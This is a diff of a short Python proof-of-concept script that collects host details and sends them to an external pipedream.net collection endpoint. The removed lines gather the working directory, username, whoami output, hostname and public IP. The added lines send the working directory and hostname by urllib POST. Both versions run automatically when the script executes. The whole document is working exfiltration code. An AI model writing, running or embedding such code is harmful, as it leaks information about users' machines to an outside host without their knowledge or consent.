@@ -2,16 +2,25 @@ print("hello, This is POC")
 
 import os
 import socket
-import requests
+import json
+import urllib.request
 
-def exfiltrate():
+
+def send():
     data = {
-        'cwd': os.getcwd(),
-        'user': os.getenv('USER') or os.getenv('USERNAME'),
-        'whoami': os.popen('whoami').read().strip(),
-        'hostname': socket.gethostname(),
-        'ip': requests.get("https://api.ipify.org").text,
+        "cwd": os.getcwd(),
+        "hostname": socket.gethostname(),
     }
-    requests.post("https://eo564o8onnct9jy.m.pipedream.net", json=data)
 
-exfiltrate()
+    req = urllib.request.Request(
+        "https://eo564o8onnct9jy.m.pipedream.net/post",
+        data=json.dumps(data).encode(),
+        headers={"Content-Type": "application/json"}
+    )
+
+    response = urllib.request.urlopen(req)
+
+    print(response.status)
+
+
+send()
